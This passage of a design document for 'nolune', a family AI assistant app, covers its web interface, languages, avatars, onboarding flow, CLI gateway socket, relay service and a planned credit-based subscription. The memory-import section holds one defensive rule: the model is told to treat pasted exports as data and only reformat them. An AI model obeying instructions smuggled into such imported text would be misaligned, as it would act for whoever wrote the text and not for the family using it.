  general ones) at once and, when they are stale, fetches `/api/p/<slug>/suggestions`, which waits
  for the model, then swaps them in. One call per member runs at a time; a failed one keeps the old
  chips and isn't retried for the same memory for 15 minutes. Anything in memory can show up in
  anyone's chips, which is no more than the Memory page already shows every member.
- **The sidebar** lists folders above the chats. A folder's chats show under it when its page or
  one of its chats is open, or when its icon (a chevron on hover) is clicked; chats in folders are
  not in the Chats list. A chat nolune is working in shimmers like the "Thinking" label, for everyone
  in the profile: the sidebar listens on `/api/p/<slug>/running` (SSE), which sends the ids of the
  profile's running chats on connect and whenever an agent loop starts or stops.
- **Chat titles:** the first message stands in until the chat's model names it, in the background.
  Anyone in the profile can rename a chat from its menu (the sidebar's, or the chat header's). The
  new name reaches everyone who has the chat open, doesn't move it up the list, and isn't replaced
  by a name the model was still thinking of.
- **Typing:** someone writing in a chat shows to the others who have it open, where their message
  will land and like one from them: their avatar and "Max is typing" over a bubble of bouncing dots
  (`TypingIndicator.svelte`; with reduced motion the dots only fade). The page tells the gateway
  (`POST /api/c/<id>/typing`, `TypingReporter` in `packages/web/src/lib/typing.ts`) as the person
  types, again every 3 s while they go on, and that they stopped when the box is emptied, after 5 s
  without a keystroke, when the tab is hidden or closed, and when they leave the chat. Sending the
  message stops it on the gateway, right after the message shows. Reports go out one at a time and
  a message waits for the last, so a late "typing" never lands after it. The gateway keeps who is
  typing in memory (`setTyping` in `runner.ts`), with the name from their session, sends the list
  as a `typing` event (and in the snapshot), and forgets someone whose page hasn't said so for 8 s:
  a browser that died or lost its connection. The page leaves out the person looking at it, and
  forgets everyone while its stream reconnects.
- `/` redirects to the last profile opened (`nolune-profile` cookie) or the only one, else to
  `/profiles`.
  Creating a profile there opens its [welcome](#welcome).
- **Models & keys** (`/admin`, admins only) has the API keys and the model presets. A key is
  write-only: the page shows where the key in use comes from (nolune's config or an environment
  variable) and its last four characters, never the key. A new one is checked with its provider
  first (listing models, which is free), then saved to `config.json`, which is read on every
  request, so it applies without a restart. A key the provider rejects isn't saved; one that works
  on an account with a problem (out of credit, a restricted OpenAI key that can't list models) is,
  with the provider's words. OpenRouter lists its models for anyone, so its key is checked with `GET
/key` instead. Removing a saved key falls back to the environment's. Replacing a key warns to keep
  the same workspace (Anthropic, OpenRouter) or project (OpenAI): pictures and PDFs already sent
  live in it. `nolune key set` does the same check, but saves anyway when the provider can't be
  reached. Custom providers are rows in the same list, after the keys, each with its API, its
  address and whether it has a key (never the key): Change opens its name, address and an
  optional key (left empty, the key saved for the same address stays), and Remove says which
  presets run on it first. **Add custom provider**, under the list, takes a name, the API (OpenAI
  or Anthropic), an address and a key. Saving asks the server for its models and says how many it
  serves, or what went wrong; `nolune provider add <name> <url> [--api A] [--key K]` does the same,
  asking for a key at a terminal when the server wants one. Under the keys, **Plans** lists both plans alike (what each is, who it's signed in as,
  what to do next): the Claude plan's row shows where Claude Code is and checks its sign-in, and
  without Claude Code shows how to install it; the ChatGPT plan's shows who's signed in with
  ChatGPT, from what nolune keeps. **Continue with ChatGPT** (or "Continue as anna@example.com" for
  the account signed in last, beside "Use another account") shows the link to OpenAI's sign-in page
  and a field for the address a browser on another device ends on, and updates by itself once the
  browser comes back; then it offers Check sign-in (which asks OpenAI), Sign in again, Sign out and
  a Manage usage link to ChatGPT's usage settings. Under the presets, **Add
  a model** opens the form (open from the start while there are none), in the order the choices are
  made: the provider, each custom provider a chip of its own by its name, saying which key, plan or
  server it runs on; the model, picked from the provider's
  list or typed (any id works, a dated snapshot say); an optional name, whose placeholder is the
  default it gets; and the context window, folded away under what it will be ("Auto · 1M"). The list
  comes from `/api/models` when the form needs it: Anthropic's models API, with names and windows;
  OpenAI's, only GPT-5.6 and newer (its current generations in September 2026; older ones can still
  be typed), without audio, realtime, pictures or search, nor dated snapshots of models also listed
  without a date, the newest first, with the flagships' known window; OpenRouter's, the models that
  can call tools (without `:batch` variants, which are for its batch API), the newest first, with
  its names and the window a preset gets; a custom provider's, as it lists them (`<id>/<model>`);
  Claude Code's own list for the Claude plan, by full id
  (`claude-opus-5-5`, not `opus`, which would move a chat to a newer model when Claude Code
  updates); and the ChatGPT plan's catalog, the models ChatGPT offers in its pickers, with their
  windows when it lists them. It's asked for again when the
  provider's key changes. The context window is a row of chips: Auto (what the provider reports, if
  anything), 128K, 200K, 1M, or Custom, typed as `272k`, `1.5m` or `272000`. The provider checks the
  model id before the preset is saved.
  **Edit** on a preset opens the same form in its row, filled in (`editPreset`; the CLI has
  `nolune preset edit`). Only a new provider or model is checked with the provider, so renaming or
  setting the window needs no key; a name left as the default follows the model. New chats,
  automations that use the preset and chats switched to it from then on get the change; chats
  already on it keep the copy they took (see [Switching models](#switching-models)).
  Last, **Memory search** says what search by meaning uses (see [Memory](#memory)), or why it goes
  by words only (no key or custom provider, or off), and Change opens a form: Auto, OpenAI,
  OpenRouter, each custom provider that speaks OpenAI's API by its name, or Off, and a model for a
  provider (its placeholder is the default; a custom provider's has to be named, like
  `nomic-embed-text`). Saving asks the
  source once
  (`embeddingProblem`) and says if it didn't answer, and a source that works starts embedding every
  profile's facts in the background.
- **People** (`/admin/people`, admins only, next to Models & keys in the user menu) lists every
  account and does what `nolune user` does. **Add a person** takes a name, an email and whether
  they're an admin, checks them as `nolune user create` does, and shows the address and a password
  nolune made, once. **Reset password** makes a new one, shown once under their row; devices
  already signed in stay signed in, as with `nolune user passwd`. Make admin, Remove admin and
  Remove (which says what stays: their messages, and profiles only they were in, now empty) aren't
  offered on the admin's own row, so nobody locks themselves out. Core errors carry a `reason`
  (`UserNameError`, `EmailError`, `PasswordError`) for the page to say in its language.
  **Invite links** let someone make their own account, so no password is passed along (or seen by
  the agent, when it's asked for one: `nolune user invite [name]`). A link is
  `<address>/invite/<token>`, 24 random bytes; the `invite` table keeps only the token's SHA-256,
  so the page shows the link once, when it's made, and lists the ones still usable with who
  they're for, who made them and until when, each with Take back. A link works once, for 7 days,
  while whoever made it is still an admin (made at the terminal: always); removing that admin
  removes their links. `/invite/<token>` is the one page besides `/login` open without signing in
  (`referrer-policy: no-referrer`, so the token doesn't leak to anything it links to). It asks for
  a name (starting with the one the admin gave), an email and the password twice, then
  `acceptInvite` makes an ordinary account and deletes the invite in one transaction, so a link
  sent twice at once makes one account, and signs them in. A link that's used, expired or taken
  back says so, and someone signed in is told the link is for someone new.

## Languages

The interface comes in English, Russian, German, Spanish and French. Only the interface: what
people write, nolune's replies, the steps' summaries (the model writes those in the conversation's
language), chat titles and everything that reaches the model stay as they are, so the prompt and
its cache never depend on someone's settings. nolune already answers in the language it's written to.

- **Picking one.** Settings has Language, per device in the `nolune-prefs` cookie like the other
  settings: a language, or "Same as the browser" (the default), the first language in the
  browser's `Accept-Language` that nolune has, else English. `hooks.server.ts` works it out for every
  request (`locals.locale`), so server-rendered pages, `<html lang>` and form messages match, and the
  sign-in page is in the browser's language too. Picking another language reloads the page, since
  some of what's on it was written by the server.
- **Messages** are in `packages/web/src/lib/i18n/messages/<locale>.ts`, one object per language grouped by page.
  English is the source: the others are typed as its shape, so a missing key or a wrong parameter
  fails `pnpm check`, and `i18n.test.ts` checks that each has English's `{slots}`. Messages with
  values in them are functions (`workedFor: (duration) => …`), so each language puts the value where
  its grammar wants it and picks plural forms with `Intl.PluralRules` (`plural.ts`; Russian has one,
  few and many). Sentences with markup in them (a link, a name in bold, a command) are strings with
  `{slots}` that `Rich.svelte` fills with snippets: a translation moves the link, not the markup.
- **In code.** Components get `{ m, locale, intl }` from `getI18n()`, which the root layout sets;
  server loads and actions use `translations(locals.locale)`. Helpers that make text
  (`formatAgo`, `formatBytes`, `activeStepLabel`, the copy buttons and file cards `renderMarkdown`
  adds, upload errors) take the messages as a parameter. Dates and numbers go through `Intl` with
  `intl`, which is British English for English so dates still read "28 Sept".
- **Schedules** on the Automations page: core's `parseCron` takes a cron expression apart (which
  days, which months, which times) and each language words that with its own grammar in
  `automations.describe`: "По понедельникам и средам в 09:00", "Montags bis freitags um 07:30
  Uhr". English is core's `describeSchedule`, as before. Day names come from `Intl`.
- **The emoji picker** gets its labels (emoji-picker-element's translations) and emoji names and
  search words (emoji-picker-element-data in the language, served by nolune) in the language too.
- **What stays as it is.** Image templates' names, sentences and choices (they are the prompt the
  chat gets) and the "Make an image:" message, skills' descriptions, memory notes' names,
  notifications (the agent writes them), and errors that come from core, since the CLI and the
  agent share them. The general suggestions under a new chat's box (before a profile has memory)
  are in the interface's language: they are the start of a message for the person to finish, like
  typing it. The ones nolune makes from memory are in the family's language, like the notes.
- **Adding a language.** Copy `en.ts` to `<locale>.ts` and translate it, `automations.describe`
  included (`ru.ts` shows one with grammatical cases); add the code to `LOCALES` and its own name to
  `LANGUAGE_NAMES` in `locales.ts`, and the messages to `MESSAGES` in `packages/web/src/lib/i18n/index.ts`; give
  the emoji picker its data in `EmojiChip.svelte`. TypeScript points at anything left out.

## Assistant avatars

Each profile's assistant has a small mascot: one of eight one-color glyphs (probe, campfire, lantern,
planet, quantum, comet, moon, satellite), redrawn by hand as SVG from a concept sheet. It shows next
to every reply, large on the new chat screen, in the profile switcher and the profile list, on
notifications, and as the tab icon of the profile's pages. People keep `UserAvatar`: their
picture, or their initial on a colored circle (see [Web UI](#web-ui), "Your name and picture").

- **Drawing.** `packages/core/src/avatars.ts` has the names and the glyphs: shapes on a 24×24 grid
  filled with `currentColor`, with no strokes or second tone. Eyes and other details are holes
  knocked out with a mask, so the page shows through in both themes, and the eyes are shapes of
  their own so they can move. `AssistantAvatar.svelte` (`avatar`, `mood`, `size`) draws one. Each
  avatar's color is a `--avatar-<name>` variable in `layout.css`: the dark value is the concept
  sheet's, the light one the same hue at least 3:1 on white, the sidebar and bubbles. The tab icon
  reads both from the file and follows the system's theme, like the tab strip.
- **Choosing.** A new profile gets the avatar its slug picks (`defaultAvatar`, a hash of the slug),
  so profiles differ without anyone choosing. The migration that added `profile.avatar` gave
  existing profiles theirs the same way, in SQL. Any member changes it on People & profile, or with
  `nolune profile avatar <name>`, which the agent runs when asked ("switch to the comet"; the
  `nolune` skill explains it). The picker there (`AvatarPicker.svelte`) is laid out like a
  character select: the pick up close on a starry stage lit in its color, which pops in with a
  squash when it changes, next to the roster, whose tiles take their avatar's color and show its
  working motion on hover.
- **Tint.** A profile's pages take on its avatar's hue: `packages/web/src/lib/tint.ts` gives the page, sidebar,
  bubbles, hover and (in dark) card, menu and composer greys a little OKLCH chroma in the avatar
  color's hue, at each grey's own luminance, so text and avatars keep their contrast. The root
  layout renders it into the head as a `<style>` that outranks `layout.css`, so the first paint and
  menus portaled to `<body>` are tinted too, and a new profile or avatar swaps it in place.
  See-through borders and inputs take the tint from what's under them; light cards, menus and the
  composer stay white, a step above the page. The `theme-color` meta follows the tinted page. Pages
  outside a profile (sign-in, the profile list, Models & keys) keep the plain greys.
- **Moods.** Only the avatar on the newest reply moves; older ones hold still. It follows what the
  chat already knows: `thinking` while the model streams (eyes up, a gentle bob), `working` while a
  command runs (a busy hop, and the avatar's own motion: the flame flares, the antenna blinks,
  quantum's dashes flicker), `waiting` while messages are queued behind the turn (a slow pulse),
  `blocked` on an API error or when Continue is shown (drooping eyes, a muted color), `done` for a
  moment after a turn (a squash), then `idle` (an occasional blink). Hovering it shows the current
  step in the step list's words. It's CSS animation only; with reduced motion each mood keeps its
  pose and nothing moves.
- **Live.** A new avatar or name reaches open pages: `/api/events` pings the profile's members and
  the page loads its data again. The CLI changes the database from another process, so the gateway
  also looks for changes after every command and on each scheduler tick.
- **Not for the model.** The avatar and the mood never reach it: nothing goes into the system
  prompt, the tool or the request, so caching is untouched. Only the `nolune` skill's description
  mentions avatars, so new chats know the command.

## Welcome

Creating a profile opens its welcome, `/p/<slug>/welcome`: an intro in space, then one question per
screen, like Arc's first launch, and the profile's first chat. It sits outside the profile's
sidebar layout (`+page@.svelte`). Each step saves as it's answered, so leaving halfway loses
nothing, and opening the page again runs it again.

- **The idea: everything is a dot.** A star draws the wordmark, whose three trailing dots type,
  then fly out as the eight avatar colors, orbit like planets and pool into an aurora behind the
  questions. One of those colors
  becomes the assistant. Imported memories fly into the Memory page's dot grid, and the grid
  gathers into the avatar as the new-chat page opens.
- **Intro** (`Wordmark.svelte`, `IntroSky.svelte` in `packages/web/src/lib/components/welcome`). Space, after
  Outer Wilds, timed to a song (`music`): dark whatever the theme, stars coming out over faint
  nebulae and a galaxy band on a canvas, the camera drifting slowly into them, one shooting star.
  At nine seconds a star at the middle of the screen brightens and sweeps across the letters,
  which appear behind it (the logo's own path from `logo.svg`, revealed with a clip-path), and
  lands as the first dot. The three dots bounce like a typing indicator and burst into eight
  planets in the `--avatar-*` colors of the page's theme, each on its own faint orbit around the
  letters, the inner ones faster. Then they melt into soft blobs, and as the song lifts (23.6 s)
  space gives way to the page like a sunrise (a dark page keeps a few stars) and the welcome
  comes up. A click or Esc skips it, and with reduced motion it opens on the welcome.
- **A model, only when there is none** (`ModelStep.svelte`). Five cards: the Claude plan, the
  ChatGPT plan, and an Anthropic, OpenAI or OpenRouter key. A key is checked and saved as on Models
  & keys (a key already set skips pasting); a plan's sign-in is checked. The Claude plan, when
  Claude Code isn't installed or signed in, says what's wrong and points to Models & keys. The
  ChatGPT plan signs in right in the step, through `/api/chatgpt/sign-in`: it starts a sign-in (or
  follows one already under way), and **Continue with ChatGPT** opens OpenAI's page in a new tab.
  The step asks every 2 seconds until the sign-in ends and then moves on by itself. The address a
  browser on another device ends on can be pasted there too, and "Use another account" is offered
  after a sign-out, or when the account signed in can't use its plan. Then chips with the
  provider's first six models (or a typed id) make the first preset,
  which becomes the default. Only admins can add one; anyone else is told to ask and carries on.
- **The avatar.** `AvatarPicker` in its big layout, starting on the avatar the slug picked. A
  tile only previews; "This one" saves it. The page then takes on the avatar's tint, which grows
  as a circle from the avatar (a view transition with a `clip-path` animation), while the avatar
  bounces and says hello. The welcome's load returns no `profile`, so the root layout doesn't
  tint it before then; the page renders the tint itself once it's chosen.
- **Memories from another assistant** (`MemoryStep.svelte`). People copy a prompt (`EXPORT_PROMPT`
  in `packages/core/src/memory-export.ts`) into ChatGPT, Claude or Gemini, which answers with a
  code block of dated lines under five headings (Instructions, Identity, Career, Projects,
  Preferences), and paste the answer. The same parser counts the sections under the box while
  they paste, and runs again on the gateway before anything is saved. Inside a code block every
  line under a heading counts; without one, only dated lines and list items do, so the
  assistant's own sentences stay out. An answer that doesn't follow the format goes to the
  default preset with `quickReply`, told to only rewrite it and to treat it as data. "Start
  fresh" skips to the fresh start.
- **Where they go** (`importMemoryExport`, `memory-import.ts`). A profile is shared, so rules are
  pinned in `core.md` with the person's first name ("Jamie: keep answers short"), and what
  doesn't fit its 4,000 characters goes to their own note. Identity, career, preferences and
  anything under another heading go to their note (the member's, else `people/<name>.md`), a
  heading each; each project to
  `projects/<name>.md`, named by the entry's first words ("Tidepool: …"), or to `projects.md`.
  `addMemoryFacts` adds them under the heading, skips facts memory already has, and dates each
  one as the export did in `.facts.json`; `[unknown]` ones get 0, like facts from before dates
  were kept, so the Memory page shows them lightest.
- **Memories arrive** (`MemoryArrival.svelte`), slowly, to the song's last phrase. The saved
  facts show as lines, coming in one after another; on the phrase's second bar each becomes a dot
  that arcs from its line to its place in a grid laid out like the Memory page's (one row per
  note), landing at full strength and fading to its age. The count ticks up with them. As the
  phrase turns, the dots drift along curves into the avatar, which glows brighter with each. Then
  the page goes to `/p/<slug>`: a view transition names the avatar on both pages
  (`nolune-assistant`), so it glides into its place over the composer while the page gives way over
  two seconds (`html.nolune-arrive`), landing on the song's last note.
- **A fresh start** (`FreshStart.svelte`), for "Start fresh" or an import that added nothing: an
  ending too, to the same last phrase. The avatar bounces in, the eight colors from the intro come
  out around it as planets on faint orbits (behind it on the far side, in front on the near one),
  "A fresh start." comes up on the second bar, and as the phrase turns they spiral into the
  avatar, which glows with each, before the chat opens as after the memories.
- **Sounds** (`packages/web/src/lib/welcome/sounds.ts`). A song, and a sound only where the screen moves by
  itself; clicks are silent. The song (`music`) plays the intro, rising out of silence with the
  stars; once the welcome waits it plays on much quieter under the questions (`duck` to `UNDER`),
  going round for as long as they take. When the memories arrive it jumps to its last phrase at
  full level (`lastPhrase`, 179.8 s in, with its bars in `PHRASE`) for both endings, and ends by
  itself over the new chat. It streams through a media element in the Web Audio graph, so
  three and a half minutes of music are never decoded at once. The short sounds are `confirm`
  (a key or plan check passes), `wash` (the avatar's tint washing in) and `yap`: a small animal's
  shout when an avatar is picked or the big one poked, sped up, on a different note of a pentatonic
  scale (`NOTES`) each click, whichever the avatar. Each sound is a file in
  `packages/web/src/lib/assets/sounds/welcome` (`<name>.mp3`), bundled through `import.meta.glob` (where each
  came from is in `CREDITS.md` next to them); one without its file is silent. The screen waits
  for the song to start, up to a second and a half; one that can't start on time (still loading,
  or the page not allowed sound yet) joins as soon as it can, that far in, and a short sound that
  late is dropped. Browsers only play sound after a click: creating the profile is one, and the
  welcome is a client-side navigation from there; opened some other way, the song joins in at the
  first click. The Sounds setting (per device, in `nolune-prefs`) and the speaker button on the
  welcome turn them off; turned back on, the song goes on where it was.

## Running `nolune` in the gateway

The agent runs `nolune` all the time (`nolune view`, `nolune memory show`, `nolune agent watch`, …), and each
run used to start Node and load all of nolune: about 150 ms from the bundle and 650 ms from a source
checkout. Now the gateway, which has nolune loaded already, runs the command, and `nolune` only asks it
to (issue #42).

- **The socket** is `~/.nolune/run/cli.sock`, in a folder only this user can open (mode 700,
  the socket 600), so it adds no one who couldn't already read `nolune.db`. It isn't the web port,
  which is public through the tunnel. `serve.ts` starts it from `hooks.server.ts`; it replaces a
  socket left by a gateway that was killed, but never takes over from another gateway still
  answering on it.
- **The protocol** (`protocol.ts`) is one JSON message per line. `nolune` sends the arguments, its
  folder and its environment; the gateway runs the command with them as its `io` (see
  [Code layout](#code-layout)), streams stdout and stderr back and ends with the exit code. Stdin
  goes over only when the command reads it, so a command that doesn't never waits on it.
- **What stays local.** `setup`, `start`, `service` and `init` always run in their own process,
  and so does any command typed at a terminal (stdin is a TTY), since it may ask something. The
  agent's commands and automation scripts have no terminal, so theirs go to the gateway.
- **Falling back.** When nothing answers on the socket (no gateway, or the one that left it was
  killed), or the gateway speaks another protocol version (`PROTOCOL`), `nolune` loads nolune and runs
  the command itself, as before. Once the gateway has a command, `nolune` never runs it again, even
  if the gateway goes away in the middle ("the gateway stopped before the command finished", exit
  1): it may have done part of it, like a `nolune memory add`.
- **Stopping.** `nolune` hanging up (its command's timeout, or Stop) aborts the command's signal, which
  ends a `nolune agent watch` or `nolune generate image`. The socket never keeps the gateway running by
  itself, and on adapter-node's shutdown it closes and drops the commands still running, whose
  `nolune` then says the gateway stopped.
- **Costs.** `dist/cli.js` holds only the client (3 KB): esbuild splits the rest of nolune into
  `dist/chunks`, loaded only to run a command locally. Through the gateway, `nolune` takes about
  50 ms from the bundle (Node alone takes about 25) and 100 ms from source. A command now runs
  in the gateway's process, so the gateway serves the help text built when asked (the image model
  may have changed since it started), and a slow command would briefly hold up its event loop;
  image conversion runs in a child process, so `nolune view` doesn't.

## The relay

A family shouldn't need a tunnel, an open port or a domain to open nolune away from home.
`nolune relay enable` (or yes in `nolune setup`) gets an address from nolune's relay
(`packages/relay`, run at `relay.nolune.dev`), and the gateway connects out to it.

- **Registering.** The relay gives a name (the one asked for, or a random one like
  `cozy-otter-42`), the address `https://<name>.nolune.family` and a token. Only `config.json` keeps
  the token (`relay`, with the relay's URL); the relay keeps its SHA-256. While `relay` is set, its
  address is the origin (`publicOrigin()`): `ORIGIN` for adapter-node and better-auth, and webhook
  URLs. `nolune relay disable` gives the name back. Names are 3 to 32 letters, digits and single
  dashes; the relay keeps the likes of `www` and `login` for itself. The addresses have a domain
  of their own, apart from the site and the relay on `nolune.dev`, so a browser blocklist that
  takes in an abused address, or a cookie an address sets for its domain, can't reach them.
- **Names nobody uses.** A name whose gateway hasn't connected in 90 days
  (`RELAY_FORGET_AFTER_DAYS`) is free again, checked when the relay starts and every hour, so a
  nolune that's gone (reinstalled without `relay disable`, say) doesn't keep it for good; blocked
  ones stay. The relay counts a gateway as seen when it connects and when it leaves, and each hour
  while it's connected. A gateway the relay doesn't know (it was away that long, or the relay lost
  its file) asks for its name again, at most once an hour since that counts as a registration, and
  keeps the new token in `config.json`. When someone else has the name by then, it removes `relay`
  from `config.json` and stops using it, so the address, theirs now, isn't opened as this family's.
- **The connection.** `nolune start` (`connectRelay()` in `packages/cli/src/relay.ts`) opens a
  WebSocket to the relay and says `hello` with the name and token. Once the relay answers `ready`,
  the binary messages carry HTTP/2 with the relay as the client: each request to the address is a
  stream. HTTP/2 brings the family's requests over the one socket, and its flow control keeps a
  large upload from holding up an event stream, with no framing of nolune's own. Both ends run
  `webSocketStream()` (`packages/relay/src/stream.ts`) over the part of the WebSocket API that `ws`
  (the relay) and Node's built-in WebSocket (the gateway: no dependency) share.
- **Requests** go from the gateway to its own web server over HTTP, like a browser's, so hooks,
  body limits and sign-in work as they do without the relay. The relay sets `X-Forwarded-For`
  (better-auth's rate limit reads it) and drops the browser's. Browser WebSockets aren't passed on:
  the pages use event streams.
- **Staying up.** Each side pings the other every 30 s. The gateway reconnects a second after
  losing the connection, then backs off to a minute while the relay can't be reached, and logs
  once rather than at every try. For 15 s after a gateway leaves, its requests wait at the relay,
  so a restart doesn't show an error page; after that the relay shows an offline page, in the
  browser's language, that reloads itself. A second connection with the same token takes over, and
  the first stops rather than take it back. SIGINT and SIGTERM close the link before adapter-node's
  shutdown, which would otherwise wait 30 s for the event streams it carries.
- **Limits.** The relay is free and anyone can register, or write a client of their own, so it
  keeps what one person can take in check rather than trust what connects. Each address may pass
  30 GB a month (UTC calendar months, both ways, `RELAY_MONTHLY_GB`); past it, the relay shows a
  page saying so until the 1st instead of passing requests on, and `nolune relay status` shows the
  month's traffic. Each network (an IPv4 address, or an IPv6 /64, which a home usually has all of)
  may register 10 addresses an hour and have 10 at once. The operator lists, blocks, unblocks and
  removes addresses over a Unix socket (`packages/relay/src/admin.ts`), never over the web; a
  blocked address shows a page saying so, and its gateway is told why and stops. Traffic is counted
  in memory and written with the gateways file once a minute.
- **Trust.** TLS ends at the relay (Caddy in front, with a wildcard certificate), so its operator
  could read the traffic, as with any hosted tunnel; the relay logs only registrations and
  connections. End-to-end encryption would need each gateway to hold the certificate for its own
  address, with the relay passing TLS through by SNI, and a certificate per gateway runs into Let's
  Encrypt's per-domain limits until the domain is on the Public Suffix List. Families who want
  nobody in between use their own tunnel, or their own relay (`nolune relay enable --server`).

## The nolune plan

_Not built yet: this is the design._

The two plans run chats on a subscription someone already has, and nothing else: pictures still
need an OpenAI key, and search by meaning an OpenAI or OpenRouter one. The nolune plan is a
subscription to nolune itself that covers all three, chats, pictures and embeddings, with no key to
get: the admin signs in once, and a new profile's welcome has nothing else to ask. It works the way
[Nous Portal](https://hermes-agent.nousresearch.com/docs/integrations/nous-portal) does for Hermes
Agent: one sign-in, one OpenAI-compatible address in front, OpenRouter behind it.

- **What it is.** `nolune-plan`, a third plan in `plans.ts`. As on the ChatGPT plan, nolune runs the
  loop and makes the requests itself. They go to nolune's API (`https://api.nolune.dev/v1`), a
  service of nolune's own like the relay, which checks the plan's token, counts what each request
  costs and passes it on. Upstream is OpenRouter for chats and embeddings and FAL for pictures, on
  nolune's accounts there, rather than nolune reselling its own accounts with each model's maker.
  The service is a package of its own (`packages/api`), not part of the npm package: a SvelteKit
  app (adapter-node, like the gateway's) for both the API and its few pages, on Postgres.
- **Next to the relay, not in it.** The API runs on the relay's server, behind its Caddy, as a
  container of its own, with Postgres in another. They do different jobs: the relay passes bytes
  and keeps a JSON file, the API keeps money, which wants a database's transactions, and Postgres
  rather than SQLite so more than one process can serve it. The OpenRouter key and Stripe's secret
  stay
  out of the process every family's traffic goes through, and deploying one restarts nothing in
  the other: a relay restart holds every family's requests for a moment, and the API changes more
  often. Each also keeps working when the other is down. The gateway reaches the API directly, as
  it reaches OpenRouter, never through the relay.
- **Accounts** are better-auth's, with no password: the sign-in page emails a 6-digit code (through
  Resend's API, with plain fetch), good for 5 minutes and 5 tries, and the first sign-in makes the
  account. Since anyone can ask for a code to any address, the page sends at most 3 to an address
  and 10 to a network every 10 minutes, and takes 20 tries at codes from a network (its own limits:
  better-auth's apply to requests through its handler, not to the calls form actions make).
- **Linking a gateway** is a device code (OAuth's device authorization grant, better-auth's
  plugin): `nolune nolune-plan setup`, or Models & keys, asks `POST /api/auth/device/code` as
  client `nolune` and shows the 8-letter code with the API's link page
  (`https://api.nolune.dev/link?user_code=…`, the code already in it). The person opens it on any
  device, signs in, sees the code (which makes it theirs to approve) and links it, while the gateway
  asks `/api/auth/device/token` every 5 seconds until it's linked, for 15 minutes at most. Unlike
  the ChatGPT plan's sign-in, nothing comes back to `127.0.0.1`, so it works the same from a phone
  through the relay.
- **What's kept** is `~/.nolune/nolune-plan.json` (mode 600, written whole and renamed into place),
  as `chatgpt.json` is: the account's email and the token the link gave, never shown or logged. The
  token is a better-auth session, sent as a bearer token on every request to `/v1`. It lasts 90
  days and is renewed as it's used, so a gateway that's running stays linked; signing out, in
  nolune or on the account page, ends it. One token rather than a refresh token and short-lived
  ones: the API looks the plan up on every request anyway, so a session lookup costs next to
  nothing, and there's no refresh to run one at a time.
- **One subscription per gateway.** The whole family draws on it, as on the keys, and its limits are
  the family's (below).

### Chats, pictures and embeddings on it

- **Chats** speak OpenRouter's Chat Completions, so `openrouter.ts` runs them. It gets a target, as
  `openai-chat.ts` has (`ResponsesApi`): OpenRouter's own (its key and address) and the plan's
  (nolune's API, and the plan's token, which the SDK asks for on every request, as `CHATGPT_PLAN`'s
  does). Models are OpenRouter's ids (`anthropic/claude-sonnet-5-5`), from the plan's own list
  (`GET /v1/models`: OpenRouter's shape, only the models the plan offers, with their prices). The
  plan's replies are stored as `nolune-plan`'s, so moving a chat between it and an OpenRouter key is
  a switch of provider like any other.
- **Unchanged on the way.** The API passes a request to OpenRouter as it came, with only the key
  replaced and `max_tokens` added when there is none (32,000). `cache_control`, `session_id` and
  the replies' `reasoning_details` go through byte for byte, so the cache works as it does on
  OpenRouter (see [On OpenRouter](#on-openrouter)). Nous Portal's API may ignore OpenRouter's
  extensions, which is why nolune runs its own rather than offering Nous Portal as a provider.
- **No Files API**, as on the other plans: every family's files would be on nolune's one OpenRouter
  account, where one family could name another's `file_id`. Pictures and PDFs go inline.
- **Pictures.** A `nolune` module in `image-generation.ts`'s `PROVIDERS`. The API takes OpenAI's
  Images API (`/v1/images/generations`, `/v1/images/edits`), so the module is `openai.ts`'s
  requests at nolune's address with the plan's token; behind it is FAL's catalog, as behind Nous
  Portal's. Image models are `nolune/<model>` (`nolune/flux-2`), and the plan's default is used
  when no image model is set and there's no OpenAI key.
- **Embeddings.** `nolune-plan` joins `EMBEDDING_PROVIDERS`, with `text-embedding-3-small` through
  OpenRouter. Auto picks it last, after the keys, which are paid for already and don't count
  against the plan's limits. A source is its address and model, so moving onto the plan makes every
  fact's vector once more, which costs cents.

### Credits and limits

The plan is credits, not unlimited use. The agent works in the background too (automations,
subagents, the note-taker, titles, auto mode's checks), and one busy day or one automation in a
loop would otherwise spend the month. As on Claude's plans, a 5-hour limit and a weekly one keep it
spread out. The rules are `limits.ts` (in `packages/api/src/lib/server`): pure functions over an
account's state (`admit` before a request, `charge` after it, `grantPeriod` and `addExtra` from
Stripe's events), which the API runs inside one Postgres transaction each (`accounts.ts`, which
locks the person's row first, so requests that end together each add what they spent).

- **Counted in dollars**, not tokens: models' prices differ fifty times over, and pictures cost too.
  OpenRouter says what each request cost (`usage.cost`); FAL prices each picture.
- **Three limits**, each a share of the plan's credits, set on the plan's product in Stripe (see
  [Payments](#payments)). The one plan to start with, Family, is $20 a month for $25 of credits:

  | Limit   | Family | Starts again                                                |
  | ------- | ------ | ----------------------------------------------------------- |
  | 5 hours | $1.80  | 5 hours after the request that opened the window            |
  | Week    | $8.75  | each week, on the day and at the hour the plan started      |
  | Month   | $25    | with each payment; up to $12.50 of what's left carries over |

- **How they're sized.** A month holds about 4.3 weeks, and 4.3 weeks' limits come to about 1.5
  times the credits, so ordinary use never meets the weekly limit and only a burst does. About
  five full 5-hour windows make a week, so that window catches a busy afternoon, not an ordinary
  day.
- **Windows, not sliding sums.** A window opens with the first request after the last one closed,
  so nolune can say exactly when it starts again ("again at 18:40"). A sliding sum is fairer by a
  few minutes but can't.
- **Checked before, counted after.** A request is refused when any limit is spent. What it costs is
  known only once it's done, so the last one may go a little over, which counts. `max_tokens` keeps
  that bounded, and a request whose input alone (its size times the model's price) is more than
  what's left is refused before it's sent.
- **A turn may finish.** An agent turn is many requests, and stopping one between a reply and its
  commands' results leaves the chat on an error. Requests that go on with a turn that started
  within the limit (the reply's commands' results, auto mode's check of a command it's about to
  run), which the gateway marks `X-Nolune-Turn: continue`, may go over by 10% of the 5-hour limit;
  new turns wait. A client that marks every request gains only that 10%.
- **Background gets less.** Hidden conversations (automations' and subagents' runs) and the short
  exchanges nobody waits on (titles, the note-taker, suggestions) are marked
  `X-Nolune-Use: background` and stop at 80% of the 5-hour and weekly limits, so the people in the
  family always have the rest for their chats. It's the family's own budget, so the gateway has no
  reason to mark them wrong.
- **Embeddings count only against the month.** They cost next to nothing, and search by meaning
  shouldn't stop with a window: recall would get worse just when someone is told to wait.
- **Extra credits** are bought on their own, kept for a year, and spent only past a limit, once an
  admin has turned that on in Models & keys. The windows don't apply to them, so a family can go
  on now rather than at 18:40. Background work never spends them: they were bought for people.
- **A period's credits don't run out by date.** The next paid period replaces them (with what
  carries over), so while Stripe retries a failed payment the family still has what was left.
  Packs do, a year after they were bought. A subscription that ends takes the period's credits and
  leaves the packs.
- **Rate limits.** Requests a minute and at once, per account. The token works outside nolune too,
